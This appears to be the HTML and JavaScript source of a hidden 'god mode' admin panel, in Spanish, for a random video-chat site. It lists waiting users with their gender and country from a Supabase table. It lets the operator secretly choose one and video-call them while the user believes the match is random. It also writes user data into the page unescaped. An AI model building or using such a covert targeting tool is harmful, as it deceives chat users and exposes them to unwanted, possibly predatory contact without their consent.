<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bliz - Modo Dios Discreto</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #111827; color: white; margin: 0; padding: 20px; }
        h1 { color: #f43f5e; font-size: 1.5rem; }
        .dashboard { display: flex; gap: 20px; flex-wrap: wrap; }
        .user-list-container { flex: 1; background: #1f2937; padding: 20px; border-radius: 10px; max-height: 80vh; overflow-y: auto; }
        .live-preview { flex: 1; background: #1f2937; padding: 20px; border-radius: 10px; display: flex; flex-direction: column; align-items: center; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #374151; font-size: 0.9rem; }
        th { color: #38bdf8; }
        button { background: #10b981; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background: #059669; }
        video { width: 100%; max-width: 400px; height: 300px; background: black; border-radius: 8px; object-fit: cover; margin-top: 10px; }
        .status-tag { color: #10b981; font-weight: bold; }
    </style>
</head>
<body>
    <h1>⚡ Panel Discreto - Modo Dios</h1>
    <p>Estado: <span class="status-tag">Oculto / En espera de conexión</span></p>

    <div class="dashboard">
        <!-- Lista de personas "buscando" -->
        <div class="user-list-container">
            <h3>Personas buscando chat</h3>
            <table>
                <thead>
                    <tr>
                        <th>ID de Usuario</th>
                        <th>Datos</th>
                        <th>Acción</th>
                    </tr>
                </thead>
                <tbody id="users-table-body">
                    <tr><td colspan="3">Buscando personas en línea...</td></tr>
                </tbody>
            </table>
        </div>

        <!-- Pantalla de la "llamada aleatoria" en curso -->
    <div class="live-preview">
            <h3>Cámara de la Conversación</h3>
            <video id="admin-remote" autoplay playsinline></video>
            <p style="margin-top: 10px; font-size: 0.9rem; color: #9ca3af;">Para el usuario, esto es una videollamada normal y aleatoria.</p>
        </div>
    </div>

    <!-- Tu vídeo local oculto o pequeño para que la llamada funcione -->
    <video id="admin-local" autoplay muted playsinline style="display:none;"></video>

    <script>
        const SUPABASE_URL = 'https://zcdgnzbegusizsxozfrr.supabase.co';
        const SUPABASE_KEY = 'TU_PUBLISHABLE_KEY_AQUI'; // Pega tu clave real de Supabase
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        let peer = null;
        let adminStream = null;
        let currentCall = null;

        async function init() {
            try {
                // Captura tu cámara y micrófono de forma silenciosa
                adminStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('admin-local').srcObject = adminStream;
            } catch (err) {
                alert("Error al activar la cámara del admin.");
            }

            peer = new Peer();
        }

        async function loadActiveUsers() {
            const { data, error } = await supabaseClient.from('active_users').select('*');
            const tbody = document.getElementById('users-table-body');
            tbody.innerHTML = '';

            if (error || !data || data.length === 0) {
                tbody.innerHTML = `<tr><td colspan="3">No hay nadie buscando en este momento.</td></tr>`;
                return;
            }

            data.forEach(user => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${user.id.substring(0, 8)}...</td>
                    <td>${user.gender} / ${user.country}</td>
                    <td><button onclick="connectToUser('${user.id}')">Conectar</button></td>
                `;
                tbody.appendChild(tr);
            });
        }

        // Función para "aparecer" en la pantalla del usuario de forma natural
        function connectToUser(targetId) {
            if (!adminStream) return;

            if (currentCall) {
                currentCall.close(); // Cierra llamada anterior si la había
            }

            // Realiza la llamada PeerJS directamente al usuario seleccionado
            currentCall = peer.call(targetId, adminStream);

            currentCall.on('stream', (remoteStream) => {
                // Muestra el vídeo del usuario en tu panel
                document.getElementById('admin-remote').srcObject = remoteStream;
            });

            currentCall.on('error', (err) => {
                alert("No se pudo conectar con el usuario.");
            });
        }

        window.onload = () => {
            init();
            loadActiveUsers();
            setInterval(loadActiveUsers, 4000); // Actualiza la lista cada 4 segundos
        };
    </script>
</body>
</html>
